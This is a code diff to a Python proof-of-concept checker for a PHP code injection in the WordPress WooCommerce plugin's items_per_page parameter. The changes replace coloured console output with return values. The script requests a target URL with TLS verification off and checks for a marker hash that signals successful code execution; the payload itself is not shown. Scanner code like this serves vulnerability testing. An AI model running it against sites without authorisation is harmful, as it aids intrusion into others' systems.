@@ -8,8 +8,8 @@ description: 插件WooCommerce中,参数items_per_page存在PHP代码注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class wordpress_woocommerce_code_exec_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class wordpress_woocommerce_code_exec_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                cprint("[+]存在wordpress 插件WooCommerce PHP代码注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在wordpress 插件WooCommerce PHP代码注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = wordpress_woocommerce_code_exec_BaseVerify(sys.argv[1])
     testVuln.run()
